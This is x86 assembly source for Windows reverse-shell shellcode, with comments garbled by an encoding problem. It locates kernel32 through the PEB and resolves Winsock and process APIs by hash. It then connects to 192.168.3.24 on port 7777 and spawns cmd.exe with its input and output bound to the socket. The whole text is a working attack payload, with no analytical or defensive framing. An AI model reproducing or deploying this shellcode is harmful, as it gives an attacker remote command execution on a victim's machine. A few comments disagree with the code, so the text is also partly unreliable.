    _start:
        ; ��ȡ kernel32.dll ����ַ
            xor eax, eax
            mov ebx, fs: [eax + 0x30] ; PEB ��ַ
            mov ebx, [ebx + 0x0C]; LDR ��ַ
            mov ebx, [ebx + 0x0C]; 
            mov ebx, [ebx]; 
            mov ebx, [ebx];
        mov eax, [ebx + 0x18]; kernel32.dll ����ַ
            mov esi, eax
            mov ebx, eax

            ; ���� PE ͷ
            add esi, 0x3C
            mov ebx, [esi]; PE header ��ַ
            add ebx, eax; PE header ��ʵ�ʵ�ַ
            lea ebx, [ebx + 0x78]; �������ַ
            mov ebx, [ebx]
            add ebx, eax; �������ʵ�ʵ�ַ
            push ebp;
            mov ebp, esp; ��ջ֡
            xor ecx, ecx;
            push ecx;
            push eax; 
            push ebx; 
            mov esi, [ebx + 0x20]; 
            add esi, eax; 
            push esi; 

            
            xor edx, edx;
            mov cx, 0xc;
            push_zero:
            push edx;
            loop push_zero;
            push esp;  
            mov ebx, esi;

            xor ecx, ecx; 
            xor edx, edx;
            xor eax, eax;

            push 0x16B3FE72; CreateProcessA
            push 0x73E2D87E; ExitProcess
            push 0xC53D4FDB; RtlZeroMemory
            push 0xEC0E4E8E; loadlib
            mov ecx, 0x4;
            lea ebx, [esp]; 




        next_func:
            mov edx, [ebp - 0x10]; edx����Ǻ�����ƫ�����ĵ�ַ
            push ecx; ���¼�����
            call find_func;
            pop ecx; ������������Ӧ��loop���Զ���ȥ1 ��ecx

            add ebx, 4; ��ʱָ����һ��Ҫ�ҵĹ�ϣֵ
            xor esi, esi;
            xor edi, edi;
            mov esi, [ebp - 0x44]; ����ָ���Ǹ��溯����ַ�Ŀռ�
            mov edi, esi; ��Ϊÿ��ѭ��esi���̶ܹ�һ��ֵ�������ȴ浽edi�У�֮ǰд����lea esi[ebp - 0x18]����̶�ס��esi��ֵ���϶����У�Ҫ��̬�ġ�
            mov[edi], eax;
            add esi, 4; ��Ϊÿ��ѭ���� - 4�ˣ�ebp - 20��ÿ�ζ�����һ�� - 4��ֵ������
            mov[ebp - 0x44], esi;
            loop next_func;

            xor ebx, ebx;
            mov ebx, [ebp - 0x40];
            push ecx;
            push 0x6c6c;
            push 0x642e3233
            push 0x5f327377;
            push esp;
            call ebx;

            mov ebx, [eax + 0x3c]; peͷ��ַ��ƫ����
            mov esi, ebx;
            add ebx, eax; peͷʵ�ʵ�ַ
            lea ebx, [ebx + 0x78]; �������ַƫ����
            mov ebx, [ebx]
            add ebx, eax; �������ʵ�ʵ�ַ
            push ebp;
            mov ebp, esp;
            xor ecx, ecx;
            push ecx;
            push eax; ����ws32����ַ
            push ebx; ���µ������ʵ�ʵ�ַ
            mov esi, [ebx + 0x20]; ��������ƫ����
            add esi, eax; 
            push esi; ���º�����ƫ�������ַ
            push ecx; �����ҵ��ĺ�����ַ
            push ecx;
            push ecx;
            push ecx;
            push ecx;
            push esp;
            mov ebx, [esi];

            xor ecx, ecx;
            xor edx, edx;
            xor eax, eax;

            push 0x60AAF9EC; connect
            push 0xADF509D9; wsasocketa
            push 0x3BFCEDCB; wsastatup
            push 0x2FBA176D; inet_addr
            push 0xEB769C33;htons
        

        
            mov ecx, 0x5;
            lea ebx, [esp]; 
            jmp next_func2;

        next_func2:
            mov edx, [ebp - 0x10]; 
            push ecx; ���¼�����
            call find_func;
            pop ecx; 
            add ebx, 4; 
            xor esi, esi;
            xor edi, edi;
            mov esi, [ebp - 0x28]; ����ָ���Ǹ��溯����ַ�Ŀռ�
            mov edi, esi; ��Ϊÿ��ѭ��esi���̶ܹ�һ��ֵ�������ȴ浽edi�У�֮ǰд����lea esi[ebp - 0x18]����̶�ס��esi��ֵ���϶����У�Ҫ��̬�ġ�
            mov[edi], eax;
            add esi, 4; ��Ϊÿ��ѭ���� - 4�ˣ�ebp - 20��ÿ�ζ�����һ�� - 4��ֵ������
            mov[ebp - 0x28], esi;
            loop next_func2;

            xor ebx, ebx;
            xor ecx, ecx;
            xor edx, edx;
            xor edi, edx;
            xor esi, esi;
            mov ebx, [ebp - 0x18]; wassocketa
            mov ecx, [ebp - 0x1c]; startup
            mov edx, [ebp - 0x20]; inet_addr
            mov edi, [ebp - 0x24]; honts;
        

            mov esp, ebp; �ָ� ESP
            pop ebp
            mov[ebp - 0x30], eax;
            mov[ebp - 0x2c], ebx;
            mov[ebp - 0x28], ecx;
            mov[ebp - 0x24], edx;
            mov[ebp - 0x20], edi;
            push esi;

            // WSTartup(0x202,&WSADATA,)
            sub esp, 0x20
            mov eax, [ebp - 0x28];
            push esp; 
            push 0x202; wVersionRequested
            call eax;

            // WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
            mov eax, [ebp - 0x2c]; wassocket
            xor ecx, ecx;
            push ecx;
            push ecx;
            push ecx;
            mov ecx, 0x0006;
            push ecx;
            mov ecx, 0x0001;
            push ecx;
            inc ecx;
            push ecx;
            call eax;
           
            push eax; socket������

            mov eax, [ebp - 0x24];
            xor ecx, ecx;               
            push 0x00000000;
            push 0x34322e33;
            push 0x2e383631;
            push 0x2e323931;192.168.3.24
            push esp;
            call eax; ����ipv4��ַ�������ֽ���
            mov edi, eax; ip

            // htons(6666)
            mov eax, [ebp - 0x20];
            push 7777;
            call eax;
            mov esi, eax; port


            // store sock_addr
            mov eax, 0x00000002;��ַ���
            sub esp, 0x10;
            xor ecx, ecx;
            mov[esp], eax;

            mov[esp + 2], si;
            mov[esp + 4], edi;
            mov[esp + 8], ecx;���㳤�ȣ�����һ������ֶΣ�padding�����Ա�֤ sockaddr_in �ṹ���� sockaddr �ṹ��Ĵ�С��ͬ����û��ʵ�����壬ͨ����ʼ��Ϊ�㡣
            mov ebx, esp; store sock_addr

            //Connect(socket,&sock_addr,sizeof(sock_addr));socket����������sock_addr�Ƕ˿ں�ip��Ϣ������һ������
            mov edx, [ebp - 0x30];

            push 16; �ṹ����Ϣ����
            push ebx;sock_addr
            mov eax, [ebp - 0x8c]; �׽���������
            push eax;
            mov ecx, [ebp - 0x30];
            call ecx;; connect;
            xor ebx, ebx            

            ; zero out 84 bytes
            xor ecx, ecx;
            mov edx, ecx
            mov cx, 84;
        zero:
            push edx
            loop zero;
            push esp;            
            pop edi;

            xor ebx, ebx

            push 0x00657865;
            push 0x2e646d63; cmd.exe

            lea ebx, [esp]; ebx��cmd.exe

            //init _STARTUPINFO
            xor edx, edx
            mov dx, 68

            mov[edi], edx;
            xor ecx, ecx;
            mov ecx, 100h;
            mov[edi + 0x2c], ecx;
            mov ecx, 0x00040000;
            mov[edi + 0x30], ecx;
            mov esi, [ebp - 0x8c]; �׽���������
            mov[edi + 0x38], esi;
            mov[edi + 0x3c], esi;
            mov[edi + 0x40], esi;

            lea edx, [edi + 68]; edx��pi, edi��si
            push esi;
            xor esi, esi

            push edx
            push edi
            push esi
            push esi
            push esi

            inc esi;
            push esi; true
            xor esi, esi;
            push esi
            push esi
            push ebx
            push esi
            mov eax, [ebp - 0x34];
            call eax;createprocess

               




        find_func:
            xor ecx, ecx;
            xor eax, eax;
            xor esi, esi;

        GetFunc:
            inc ecx; ��ż�����
            mov esi, [edx]; 
            add edx, 4;
            add esi, [ebp - 8];             
            xor edi, edi;
        ComputeHash:
            lodsb; 
            test al, al; 
            jz DoneHash; 
            ror edi, 13;
            add edi, eax;
            jmp ComputeHash
        DoneHash :
            cmp edi, [ebx]; 
            jnz GetFunc; 

            
            xor edi, edi;
            xor esi, esi;
            mov edi, [ebp - 0xc]; 
            mov esi, [edi + 0x24]; 
            add esi, [ebp - 8]; 
            dec ecx;
            mov cx, [esi + ecx * 2]; 
        
            mov esi, [edi + 0x1C]; 
            add esi, [ebp - 8]; 
            mov eax, [esi + ecx * 4];
            add eax, [ebp - 8]; 
            ret;


    


